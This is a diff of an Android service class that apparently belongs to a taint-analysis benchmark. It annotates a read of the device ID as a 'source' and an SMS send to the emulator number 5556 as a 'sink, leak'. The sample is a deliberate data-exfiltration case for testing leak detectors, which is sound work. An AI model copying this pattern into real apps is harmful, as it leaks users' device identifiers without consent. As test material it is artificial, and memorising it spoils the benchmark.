@@ -21,7 +21,7 @@ public class ServiceEventSequence2 extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
-		this.d1 = tMgr.getDeviceId();
+		this.d1 = tMgr.getDeviceId(); //  source
 		
         return Service.START_NOT_STICKY;
     }
@@ -37,7 +37,7 @@ public class ServiceEventSequence2 extends Service {
         this.d2 = this.d1;
         
         if(!d3.isEmpty())
-        	SmsManager.getDefault().sendTextMessage("5556", null, d3, null, null);
+        	SmsManager.getDefault().sendTextMessage("5556", null, d3, null, null); //  sink, leak
 		
 //        Toast.makeText(getApplicationContext(), "BOUND", Toast.LENGTH_SHORT).show();
         return mBinder;
